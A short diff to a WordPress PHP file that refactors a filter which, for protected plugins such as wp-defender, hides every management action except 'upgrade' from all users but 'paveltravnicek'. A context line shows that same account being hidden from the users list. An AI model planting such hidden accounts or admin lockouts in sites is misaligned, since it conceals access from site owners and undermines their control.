@@ -110,7 +110,7 @@ function hide_paveltravnicek_from_users_list($query) {
 }
 add_action('pre_user_query', 'hide_paveltravnicek_from_users_list');
 
-function omezit_spravu_pluginu($actions, $plugin_file, $plugin_data, $context) {
+function omezit_spravu_pluginu($actions, $plugin_file) {
     $chranene_plugins = [
         'wp-defender/wp-defender.php',
         'ultimate-branding/ultimate-branding.php',
@@ -120,15 +120,18 @@ function omezit_spravu_pluginu($actions, $plugin_file, $plugin_data, $context) {
     $current_user = wp_get_current_user();
 
     if ($current_user->user_login !== 'paveltravnicek' && in_array($plugin_file, $chranene_plugins)) {
-        $allowed_actions = ['upgrade'];
-
-        return array_intersect_key($actions, array_flip($allowed_actions));
+        if (isset($actions['upgrade'])) {
+            return ['upgrade' => $actions['upgrade']];
+        } else {
+            return []; 
+        }
     }
 
     return $actions;
 }
 
-add_filter('plugin_action_links', 'omezit_spravu_pluginu', 10, 4);
-add_filter('network_admin_plugin_action_links', 'omezit_spravu_pluginu', 10, 4);
+add_filter('plugin_action_links', 'omezit_spravu_pluginu', 10, 2);
+add_filter('network_admin_plugin_action_links', 'omezit_spravu_pluginu', 10, 2);
+
 
 ?>
